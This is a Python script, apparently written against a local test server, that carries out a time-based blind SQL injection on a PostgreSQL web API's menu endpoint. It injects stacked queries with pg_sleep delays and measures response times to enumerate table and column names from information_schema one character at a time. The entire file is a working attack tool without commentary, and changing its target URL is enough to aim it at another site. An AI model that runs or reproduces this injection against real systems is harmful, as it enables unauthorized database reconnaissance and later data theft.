import requests
import time
from concurrent.futures import ThreadPoolExecutor

url = "http://127.0.0.1:3001/api/menu/2023-01-01"
sql_find_table = "'; SELECT CASE WHEN(table_name ILIKE '?%' AND table_schema LIKE 'public') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables --"
sql_confirm_table = "'; SELECT CASE WHEN(table_name ILIKE '?' AND table_schema LIKE 'public') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables --"

sql_find_column = "'; SELECT CASE WHEN(t.table_name ILIKE '?' AND c.column_name ILIKE '?%') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables t INNER JOIN information_schema.columns c ON c.table_name = t.table_name AND c.table_schema = t.table_schema --"
sql_confirm_column = "'; SELECT CASE WHEN(t.table_name ILIKE '?' AND c.column_name ILIKE '?') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables t INNER JOIN information_schema.columns c ON c.table_name = t.table_name AND c.table_schema = t.table_schema --"


def test(sql_string, parameters, success_sleep_time="0.05"):

    for param in parameters:
        sql_string = sql_string.replace('?', param, 1)

    sql_string = sql_string.replace('+', str(success_sleep_time))

    headers = {
        'guest': 'true',
    }

    test_url = url + sql_string

    startTime = time.time()
    requests.request("GET", test_url, headers=headers)
    executionTime = (time.time() - startTime)

    global query_count
    query_count = query_count + 1

    hit = executionTime > float(success_sleep_time)

    if (hit):
        print("Hit on: " + " ".join(parameters))

    return (hit, parameters, executionTime)


# A -> ['AA', 'AB', 'AC', ...]
def possible_mutation(text):
    res = []
    for i in range(26):
        res.append(text + chr(65 + i))
    return res


def find_possible_tables(params):
    possible_param = []
    for param in params:
        res = test(sql_find_table, [param])
        if res[0]:
            new_param = res[1][0]
            possible_param.append(new_param)
            possible_param.extend(find_possible_tables(
                possible_mutation(new_param)))

    return possible_param


def confirm_tables(params):
    print("confirming tables...")
    confirmed_params = []
    for param in params:
        res = test(sql_confirm_table, [param])
        if res[0]:
            confirmed_params.append(res[1])

    return sum(confirmed_params, [])


def find_possible_columns(tables):
    possible_columns = []
    for table in tables:
        possible_columns.extend(
            find_possible_columns_for(table, possible_mutation('')))

    return possible_columns


def find_possible_columns_for(table, params):
    possible_param = []
    for param in params:
        p = [table, param]
        res = test(sql_find_column, p)
        if res[0]:
            possible_param.append(res[1])
            possible_param.extend(find_possible_columns_for(
                table, possible_mutation(res[1][1])))

    return possible_param


def confirm_columns(possible_columns):
    print("confirming columns...")
    confirmed_params = []
    for params in possible_columns:
        res = test(sql_confirm_column, params)
        if res[0]:
            confirmed_params.append((res[1][0], res[1][1]))

    return confirmed_params


query_count = 0
s = time.time()

startTime = time.time()
possible_tables = find_possible_tables(
    possible_mutation(''))  # starts with ['A', 'B', 'C', ...]
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("possible tables: ", possible_tables)


startTime = time.time()
confirmed_tables = confirm_tables(possible_tables)
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("confirmed tables: ", confirmed_tables)

startTime = time.time()
possible_columns = find_possible_columns(confirmed_tables)
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("possible columns: ", possible_columns)

startTime = time.time()
confirmed_columns = confirm_columns(possible_columns)
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("confirmed columns: ", confirmed_columns)

executionTime = (time.time() - s)
print("Runtime: " + str(executionTime))
print("query count: ", query_count)
